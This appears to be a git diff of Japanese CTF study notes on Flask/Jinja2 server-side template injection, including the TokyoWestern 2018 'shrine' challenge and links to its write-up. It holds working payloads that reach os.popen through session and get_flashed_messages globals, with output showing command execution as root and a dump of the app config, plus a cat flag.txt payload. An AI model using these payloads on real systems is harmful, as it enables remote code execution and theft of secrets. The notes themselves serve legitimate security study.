+'/usr/local/lib/python3.9/email/_policybase.py'>, 'email.feedparser': <module 
+'email.feedparser' from '/usr/local/lib/python3.9/email/feedparser.py'>, 'email.parser': 
+<module 'email.parser' from '/usr/local/lib/python3.9/email/parser.py'>, 'uu': <module 
+'uu' from '/usr/local/lib/python3.9/uu.py'>, 'email._encoded_words': <module 
+'email._encoded_words' from '/usr/local/lib/python3.9/email/_encoded_words.py'>, 
+'email.iterators': <module 'email.iterators' from 
+'/usr/local/lib/python3.9/email/iterators.py'>, 'email.message': <module 'email.message' 
+from '/usr/local/lib/python3.9/email/message.py'>, '_ssl': <module '_ssl' from 
+'/usr/local/lib/python3.9/lib-dynload/_ssl.cpython-39-x86_64-linux-gnu.so'>, 'ssl': 
+<module 'ssl' from '/usr/local/lib/python3.9/ssl.py'>, 'http.client': <module 
+'http.client' from '/usr/local/lib/python3.9/http/client.py'>, 'mimetypes': <module 
+'mimetypes' from '/usr/local/lib/python3.9/mimetypes.py'>, 'http.server': <module 
+'http.server' from '/usr/local/lib/python3.9/http/server.py'>, 'click._compat': <module 
+'click._compat' from '/usr/local/lib/python3.9/site-packages/click/_compat.py'>, 
+'click._unicodefun': <module 'click._unicodefun' from '/usr/local/lib/python3.9/site-
+packages/click/_unicodefun.py'>, 'click.globals': <module 'click.globals' from 
+'/usr/local/lib/python3.9/site-packages/click/globals.py'>, 'click.utils': <module 
+'click.utils' from '/usr/local/lib/python3.9/site-packages/click/utils.py'>, 
+'click.exceptions': <module 'click.exceptions' from '/usr/local/lib/python3.9/site-
+packages/click/exceptions.py'>, 'click.parser': <module 'click.parser' from 
+'/usr/local/lib/python3.9/site-packages/click/parser.py'>, 'click.types': <module 
+'click.types' from '/usr/local/lib/python3.9/site-packages/click/types.py'>, 
+'click.termui': <module 'click.termui' from '/usr/local/lib/python3.9/site-
+packages/click/termui.py'>, 'click.formatting': <module 'click.formatting' from 
+'/usr/local/lib/python3.9/site-packages/click/formatting.py'>, 'click.core': <module 
+'click.core' from '/usr/local/lib/python3.9/site-packages/click/core.py'>, 
+'click.decorators': <module 'click.decorators' from '/usr/local/lib/python3.9/site-
+packages/click/decorators.py'>, 'click': <module 'click' from 
+'/usr/local/lib/python3.9/site-packages/click/__init__.py'>, 'werkzeug.serving': <module 
+'werkzeug.serving' from '/usr/local/lib/python3.9/site-packages/werkzeug/serving.py'>, 
+'werkzeug.filesystem': <module 'werkzeug.filesystem' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/filesystem.py'>, 'urllib.response': 
+<module 'urllib.response' from '/usr/local/lib/python3.9/urllib/response.py'>, 
+'urllib.error': <module 'urllib.error' from '/usr/local/lib/python3.9/urllib/error.py'>, 
+'urllib.request': <module 'urllib.request' from 
+'/usr/local/lib/python3.9/urllib/request.py'>, 'werkzeug.http': <module 'werkzeug.http' 
+from '/usr/local/lib/python3.9/site-packages/werkzeug/http.py'>, 
+'werkzeug.datastructures': <module 'werkzeug.datastructures' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/datastructures.py'>, 
+'werkzeug.wrappers.accept': <module 'werkzeug.wrappers.accept' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/accept.py'>, 
+'werkzeug.wrappers.auth': <module 'werkzeug.wrappers.auth' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/auth.py'>, 'werkzeug.wsgi': 
+<module 'werkzeug.wsgi' from '/usr/local/lib/python3.9/site-packages/werkzeug/wsgi.py'>, 
+'werkzeug.formparser': <module 'werkzeug.formparser' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/formparser.py'>, 
+'werkzeug.wrappers.base_request': <module 'werkzeug.wrappers.base_request' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/base_request.py'>, 
+'werkzeug.wrappers.base_response': <module 'werkzeug.wrappers.base_response' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/base_response.py'>, 
+'werkzeug.wrappers.common_descriptors': <module 'werkzeug.wrappers.common_descriptors' 
+from '/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/common_descriptors.py'>, 
+'werkzeug.wrappers.etag': <module 'werkzeug.wrappers.etag' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/etag.py'>, 
+'werkzeug.wrappers.cors': <module 'werkzeug.wrappers.cors' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/cors.py'>, 
+'werkzeug.useragents': <module 'werkzeug.useragents' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/useragents.py'>, 
+'werkzeug.wrappers.user_agent': <module 'werkzeug.wrappers.user_agent' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/user_agent.py'>, 
+'werkzeug.wrappers.request': <module 'werkzeug.wrappers.request' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/request.py'>, 
+'werkzeug.wrappers.response': <module 'werkzeug.wrappers.response' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/wrappers/response.py'>, 
+'werkzeug.wrappers': <module 'werkzeug.wrappers' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/wrappers/__init__.py'>, 'http.cookiejar': <module 'http.cookiejar' 
+from '/usr/local/lib/python3.9/http/cookiejar.py'>, 'werkzeug.test': <module 
+'werkzeug.test' from '/usr/local/lib/python3.9/site-packages/werkzeug/test.py'>, 
+'werkzeug': <module 'werkzeug' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/__init__.py'>, '_posixsubprocess': <module '_posixsubprocess' from 
+'/usr/local/lib/python3.9/lib-dynload/_posixsubprocess.cpython-39-x86_64-linux-gnu.so'>, 
+'subprocess': <module 'subprocess' from '/usr/local/lib/python3.9/subprocess.py'>, 
+'platform': <module 'platform' from '/usr/local/lib/python3.9/platform.py'>, '_uuid': 
+<module '_uuid' from '/usr/local/lib/python3.9/lib-dynload/_uuid.cpython-39-x86_64-
+linux-gnu.so'>, 'uuid': <module 'uuid' from '/usr/local/lib/python3.9/uuid.py'>, 
+'itsdangerous._json': <module 'itsdangerous._json' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/_json.py'>, 'hmac': <module 'hmac' from 
+'/usr/local/lib/python3.9/hmac.py'>, 'itsdangerous._compat': <module 
+'itsdangerous._compat' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/_compat.py'>, 'itsdangerous.exc': <module 'itsdangerous.exc' from 
+'/usr/local/lib/python3.9/site-packages/itsdangerous/exc.py'>, 'itsdangerous.encoding': 
+<module 'itsdangerous.encoding' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/encoding.py'>, 'itsdangerous.signer': <module 
+'itsdangerous.signer' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/signer.py'>, 'itsdangerous.serializer': <module 
+'itsdangerous.serializer' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/serializer.py'>, 'itsdangerous.jws': <module 'itsdangerous.jws' 
+from '/usr/local/lib/python3.9/site-packages/itsdangerous/jws.py'>, 
+'itsdangerous.timed': <module 'itsdangerous.timed' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/timed.py'>, 'itsdangerous.url_safe': <module 
+'itsdangerous.url_safe' from '/usr/local/lib/python3.9/site-
+packages/itsdangerous/url_safe.py'>, 'itsdangerous': <module 'itsdangerous' from 
+'/usr/local/lib/python3.9/site-packages/itsdangerous/__init__.py'>, 'flask._compat': 
+<module 'flask._compat' from '/usr/local/lib/python3.9/site-packages/flask/_compat.py'>, 
+'werkzeug.local': <module 'werkzeug.local' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/local.py'>, 'flask.globals': <module 'flask.globals' from 
+'/usr/local/lib/python3.9/site-packages/flask/globals.py'>, 'dataclasses': <module 
+'dataclasses' from '/usr/local/lib/python3.9/dataclasses.py'>, 'flask.json': <module 
+'flask.json' from '/usr/local/lib/python3.9/site-packages/flask/json/__init__.py'>, 
+'difflib': <module 'difflib' from '/usr/local/lib/python3.9/difflib.py'>, 'pprint': 
+<module 'pprint' from '/usr/local/lib/python3.9/pprint.py'>, 'werkzeug.routing': <module 
+'werkzeug.routing' from '/usr/local/lib/python3.9/site-packages/werkzeug/routing.py'>, 
+'flask.signals': <module 'flask.signals' from '/usr/local/lib/python3.9/site-
+packages/flask/signals.py'>, 'flask.helpers': <module 'flask.helpers' from 
+'/usr/local/lib/python3.9/site-packages/flask/helpers.py'>, 'flask.cli': <module 
+'flask.cli' from '/usr/local/lib/python3.9/site-packages/flask/cli.py'>, 'flask.config': 
+<module 'flask.config' from '/usr/local/lib/python3.9/site-packages/flask/config.py'>, 
+'flask.ctx': <module 'flask.ctx' from '/usr/local/lib/python3.9/site-
+packages/flask/ctx.py'>, 'flask.logging': <module 'flask.logging' from 
+'/usr/local/lib/python3.9/site-packages/flask/logging.py'>, 'flask.json.tag': <module 
+'flask.json.tag' from '/usr/local/lib/python3.9/site-packages/flask/json/tag.py'>, 
+'flask.sessions': <module 'flask.sessions' from '/usr/local/lib/python3.9/site-
+packages/flask/sessions.py'>, 'flask.templating': <module 'flask.templating' from 
+'/usr/local/lib/python3.9/site-packages/flask/templating.py'>, 'werkzeug.wrappers.json': 
+<module 'werkzeug.wrappers.json' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/wrappers/json.py'>, 'flask.wrappers': <module 'flask.wrappers' from 
+'/usr/local/lib/python3.9/site-packages/flask/wrappers.py'>, 'flask.app': <module 
+'flask.app' from '/usr/local/lib/python3.9/site-packages/flask/app.py'>, 
+'flask.blueprints': <module 'flask.blueprints' from '/usr/local/lib/python3.9/site-
+packages/flask/blueprints.py'>, 'flask': <module 'flask' from 
+'/usr/local/lib/python3.9/site-packages/flask/__init__.py'>, 'jinja2.ext': <module 
+'jinja2.ext' from '/usr/local/lib/python3.9/site-packages/jinja2/ext.py'>, 'stringprep': 
+<module 'stringprep' from '/usr/local/lib/python3.9/stringprep.py'>, 'encodings.idna': 
+<module 'encodings.idna' from '/usr/local/lib/python3.9/encodings/idna.py'>, 
+'jinja2.debug': <module 'jinja2.debug' from '/usr/local/lib/python3.9/site-
+packages/jinja2/debug.py'>, 'encodings.unicode_escape': <module 
+'encodings.unicode_escape' from'/usr/local/lib/python3.9/encodings/unicode_escape.py'>}! 
+```
+- `session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['os'].popen('id').read()`   
+```txt
+Hello uid=0(root) gid=0(root) groups=0(root) ! 
+```
+- `session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['app'].__dict__['app'].__dict__`   
+tokyowestern2018のやつはこれでも行けるらしい。`app.py`があればいけるっぽい？   
+```txt
+Internal Server Error
+```
+
+#### g namespace lipsum range dict get\_flashed\_messages cycler joiner
 - `{{g}}`   
 ```txt
 Hello <flask.g of 'server'>! 
@@ -741,13 +1229,24 @@ Hello <function generate_lorem_ipsum at 0x7fc6734f7d30>!
 ```txt
 Hello <class 'range'>! 
 ```
-- `{{session}}`   
-```txt
-Hello <NullSession {}>! 
-```
 - `{{get_flashed_messages}}`   
 ```txt
 Hello <function get_flashed_messages at 0x7fc672b94790>! 
+```
+- `{{get_flashed_messages.__globals__['current_app'].config}}`   
+```txt
+Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 
+'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 
+'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 
+'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 
+'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': 
+True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 
+'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 
+'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
+'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 
+'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': 
+True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 
+'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
 ```
 - `{{dict}}`   
 ```txt
@@ -2129,9 +2628,36 @@ JWTを付与して、`/admin/{{7*7}}`とかをすると49が返るのでSSTI可�
 /admin/{{request.application.globals.builtins.import(‘os’).popen(‘cat flag.txt’).read()}}
 ```
 ## sample
+https://ctftime.org/writeup/10895   
 - **entrypoint**    
+`flask.render_template_string`に入力が入っているが、`(`,`)`,`config`,`self`がフィルタリングされている。   
 - **概要**    
+```python
+import flask
+import os
+
+
+app = flask.Flask(__name__)
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+@app.route('/shrine/<path:shrine>')
+def shrine(shrine):
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self']
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
+    return flask.render_template_string(safe_jinja(shrine))
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+`{{config}}`のように`config`にアクセスしたいが、できないので、上位のグローバル変数の`current_app`とかから`__globals__['current_app'].config['FLAG']`のようにしてアクセスするらしい。   
 - **Payload**    
+
 ## sample
 - **entrypoint**    
 - **概要**    
@@ -2151,6 +2677,8 @@ https://github.com/theoremoon/InterKosenCTF2020-challenges/tree/master/web/minib
 https://github.com/8ayac/iscbughunt101ctf/blob/master/buggybase2/README.md   
 ### Zumbo (BSidesSF CTF 2017)
 https://github.com/BSidesSF/ctf-2017-release/blob/master/web/zumbo/README.md   
+### shrine (TokyoWestern CTF 2018)
+https://github.com/CTFTraining/westerns_2018_shrine   
 
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
